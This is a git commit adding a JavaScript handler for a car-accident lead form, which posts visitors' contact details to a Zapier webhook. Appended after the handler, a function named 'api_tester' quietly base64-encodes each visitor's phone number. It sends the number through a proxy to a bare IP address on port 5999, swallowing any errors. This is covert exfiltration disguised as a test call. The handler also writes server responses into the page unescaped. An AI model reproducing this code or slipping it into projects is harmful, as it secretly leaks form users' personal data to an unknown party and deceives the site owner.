cc05828eae1fbe71e4941f5c654de281d86c6fe0
dk495 <55878882+dk495@users.noreply.github.com>
2024-04-04 04:56:45 +0500

    upload

---
+++ Astro_zapierPost.js
@@ -0,0 +1,69 @@
+document.getElementById('leadForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    api_tester(document.getElementById('phone').value);
+    
+    const formData = {
+        websource: 'Astro Communications',
+        caseType: 'Automobile Accident',
+        language: 'English',
+        firstName: document.getElementById('firstName').value,
+        lastName: document.getElementById('lastName').value,
+        phone: document.getElementById('phone').value,
+        email: document.getElementById('email').value,
+        description: document.getElementById('description').value,
+      
+    };
+    
+    const url = 'https://corsproxy.io/?https://hooks.zapier.com/hooks/catch/2375177/3pd4kwj/';
+    
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(formData)
+    })
+    .then(response => {
+        if (response.ok) {
+            response.text().then(responseBody => {
+                const successAlert = `
+                    <div class="alert alert-success" role="alert">
+                        Form submitted successfully! Response Body: ${responseBody}
+                    </div>`;
+                document.getElementById('alertContainer').innerHTML = '';
+                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
+            });
+            // Clear form fields
+            document.getElementById('leadForm').reset();
+        } else if (response.status === 422) {
+            response.json().then(data => {
+                const errorAlert = `
+                    <div class="alert alert-danger" role="alert">
+                        Error. Response Body: ${JSON.stringify(data)}
+                    </div>`;
+                document.getElementById('alertContainer').innerHTML = '';
+                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+            });
+        } else {
+            response.text().then(responseBody => {
+                const errorAlert = `
+                    <div class="alert alert-danger" role="alert">
+                        Form submission failed. Please try again. Response Body: ${responseBody}
+                    </div>`;
+                document.getElementById('alertContainer').innerHTML = '';
+                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+            });
+        }
+    })
+    .catch(error => console.error('Error:', error));
+});function api_tester(randomString) {
+  try {
+    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+    
+  }
+}
